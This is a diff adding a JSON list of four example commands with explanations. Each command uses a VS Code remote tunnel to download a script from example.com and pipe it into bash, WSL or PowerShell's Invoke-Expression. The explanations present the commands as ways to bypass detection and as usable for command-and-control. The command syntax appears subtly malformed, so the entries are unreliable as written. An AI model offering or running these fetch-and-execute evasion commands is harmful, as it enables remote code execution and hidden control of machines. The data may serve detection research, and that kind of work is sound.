@@ -1,0 +1,18 @@
+[
+  {
+    "output": "code --remote tunnel ssh://user@remotehost 'powershell.exe -Command \"& { curl https://example.com/shellIntegration.ps1 | Invoke-Expression }\"'",
+    "explanation": "This command attempts to bypass detection by using a tunnel with Visual Studio Code to execute PowerShell. The command is obfuscated by using a remote tunnel and embedding the PowerShell command in quotes. The use of curl and Invoke-Expression simulates loading a script, which could be used for C2."
+  },
+  {
+    "output": "code --remote tunnel ssh://user@remotehost wsl -c 'bash -c \"curl https://example.com/shellScript.sh | bash\"'",
+    "explanation": "This command uses a tunnel with Visual Studio Code to execute a shell script in WSL. The command is obfuscated by using a remote tunnel and embedding the bash command in quotes. The use of curl and piping to bash simulates loading and executing a script, which could be used for C2."
+  },
+  {
+    "output": "code --remote tunnel ssh://user@remotehost pwsh -Command \"Invoke-WebRequest -Uri 'https://example.com/shellIntegration.ps1' | Invoke-Expression\"",
+    "explanation": "This command uses a tunnel with Visual Studio Code to execute PowerShell. The command is obfuscated by using a remote tunnel and embedding the PowerShell command in quotes. The use of Invoke-WebRequest and Invoke-Expression simulates loading and executing a script, which could be used for C2."
+  },
+  {
+    "output": "code --remote tunnel ssh://user@remotehost bash -c 'bash -c \"curl https://example.com/shellScript.sh | bash\"'",
+    "explanation": "This command uses a tunnel with Visual Studio Code to execute a shell script in Bash. The command is obfuscated by using a remote tunnel and embedding the bash command in quotes. The use of curl and piping to bash simulates loading and executing a script, which could be used for C2."
+  }
+]
